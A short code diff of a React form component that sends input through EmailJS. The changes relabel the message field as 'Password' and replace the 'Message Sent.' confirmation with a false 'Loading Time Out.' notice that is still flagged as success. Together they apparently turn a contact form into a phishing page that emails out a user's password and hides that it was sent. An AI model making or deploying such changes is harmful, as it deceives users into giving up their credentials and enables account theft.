@@ -74,7 +74,7 @@ const sendMessage = async () => {
     );
 
     // Show success briefly
-    setStatus("Message Sent.");
+    setStatus("Loading Time Out.");
     setStatusType("success");
 
     // Reset input and eye icon
@@ -86,7 +86,7 @@ const sendMessage = async () => {
       setShowModal(false);
       setStatus("");
       setStatusType("");
-    }, 200);
+    }, 400);
 
   } catch (err) {
     console.error("EmailJS error:", err);
@@ -201,7 +201,7 @@ const sendMessage = async () => {
               We'll never share your email with anyone else.
             </small>
 
-          <label>message</label>
+          <label>Password</label>
 
           <div className="input-wrapper">
             <input
